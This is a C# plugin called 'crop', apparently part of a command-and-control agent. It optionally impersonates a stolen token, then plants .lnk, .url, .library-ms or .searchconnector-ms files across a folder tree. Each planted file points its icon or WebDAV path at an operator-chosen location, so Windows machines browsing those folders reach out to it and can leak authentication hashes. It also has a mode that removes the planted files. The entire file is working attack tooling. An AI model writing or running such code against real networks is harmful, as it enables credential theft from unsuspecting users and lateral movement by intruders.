using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace crop
{
    public class Crop : IPlugin
    {
        public string Name => "crop";
        public IAgentConfig config { get; set; }
        public static IMessageManager messageManager { get; set; }
        public ILogger logger { get; set; }
        public ITokenManager tokenManager { get; set; }

        public Crop(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            Crop.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            if (job.task.token != 0)
            {
                tokenManager.Impersonate(job.task.token);
            }

            //Todo update this to serialize a config object
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            var recurse = bool.Parse(args["recurse"]);
            var clean = bool.Parse(args["clean"]);


            Config.targetLocation = args["targetLocation"].ToString();
            Config.targetFilename = args["targetFilename"].ToString();
            Config.targetPath = args["targetPath"].ToString();


            if (!Config.targetLocation.EndsWith("\\"))
                Config.targetLocation = Config.targetLocation + "\\";

            if (Config.targetFilename.EndsWith(".lnk"))
            {
                if (!args.ContainsKey("targetIcon") || string.IsNullOrEmpty(args["targetIcon"].ToString()))
                {
                    messageManager.Write("No Target Icon specified" + Environment.NewLine, job.task.id, true, "error");
                    return;
                }

                Config.targetIcon = args["targetIcon"].ToString().Trim();

                messageManager.WriteLine("[*] Setting LNK value: " + Config.targetIcon, job.task.id, false);
                messageManager.WriteLine("[*] Icon location: " + Config.targetPath, job.task.id, false);

                try
                {
                    if (recurse)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            var output = f + Config.targetFilename;
                            messageManager.WriteLine("[*] Writing LNK to: " + output, job.task.id, false);
                            CropHelper.CreateLNKCrop(output);
                        }
                    }
                    else if (clean)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            if (File.Exists(f + Config.targetFilename))
                            {
                                File.Delete(f + Config.targetFilename);
                                messageManager.WriteLine("[*] Removing file: " + f + Config.targetFilename, job.task.id, false);
                            }
                        }
                    }
                    else
                    {
                        var output = Config.targetLocation + Config.targetFilename;
                        messageManager.WriteLine("[*] Writing LNK to: " + output, job.task.id, false);
                        CropHelper.CreateLNKCrop(output);
                    }
                }
                catch (Exception e)
                {
                    messageManager.WriteLine(e.ToString(), job.task.id, true, "error");
                }
            }
            else if (Config.targetFilename.ToLower().EndsWith(".url") || Config.targetFilename.ToLower().EndsWith(".library-ms") || Config.targetFilename.ToLower().EndsWith(".searchconnector-ms"))
            {
                messageManager.WriteLine("[*] Setting WebDAV value: " + Config.targetPath, job.task.id, false);
                try
                {

                    if (recurse)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            var output = f + Config.targetFilename;
                            messageManager.WriteLine("[*] Writing file to: " + output, job.task.id, false);
                            CropHelper.CreateFileCrop(output);
                        }
                    }
                    else if (clean)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            if (File.Exists(f + Config.targetFilename))
                            {
                                File.Delete(f + Config.targetFilename);
                                messageManager.WriteLine("[*] Removing file: " + Config.targetFilename, job.task.id, false);
                            }
                        }
                    }
                    else
                    {
                        var output = Config.targetLocation + Config.targetFilename;
                        messageManager.WriteLine("[*] Writing file to: " + output, job.task.id, false);
                        CropHelper.CreateFileCrop(output);
                    }
                }
                catch (Exception e)
                {
                    messageManager.WriteLine(e.ToString(), job.task.id, true, "error");
                    return;
                }
            }
            else
            {
                messageManager.WriteLine("[!] Not a valid file: " + Config.targetFilename, job.task.id, true, "error");
                return;
            }
            messageManager.WriteLine("[*] Done.", job.task.id, true);
            if (job.task.token != 0)
            {
                tokenManager.Revert();
            }
        }
    }
}
